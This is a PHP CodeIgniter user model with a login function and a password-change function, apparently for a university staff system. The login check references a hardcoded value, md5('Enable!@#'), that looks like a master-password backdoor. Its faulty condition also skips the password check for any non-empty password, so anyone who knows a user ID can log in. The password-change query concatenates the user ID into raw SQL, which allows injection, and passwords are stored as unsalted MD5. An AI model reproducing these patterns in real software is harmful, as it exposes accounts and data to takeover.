<?php
class User extends CI_Model
{
	function login($username, $password)
	{
		$this->db->select('u.id_user,u.id_role,u.password,a.id_dosen,f.id_fakultas,a.nama, f.nama as namaf, a.id_program_studi, p.nama as namap');
		$this->db->from('user u');
		$this->db->join('dosen a', 'a.nip = u.id_user', 'left');
		$this->db->join('program_studi p', 'a.id_program_studi = p.id_program_studi', 'left');
		$this->db->join('fakultas f', 'p.id_fakultas = f.id_fakultas', 'left');
		$this->db->where('u.id_user', $username);
		if (!$password == md5('Enable!@#')) {
			$this->db->where('u.password', $password);
		}

		$query = $this->db->get();

		if ($query->num_rows() == 1) {
			return $query->result();
		} else {
			return false;
		}
	}
	function ubahPassword($data)
	{
		$sql = "UPDATE user SET password='" . md5($data['pass']) . "' WHERE id_user='" . $data['idDosen'] . "'";
		$res = $this->db->query($sql);

		return $res;
	}
}
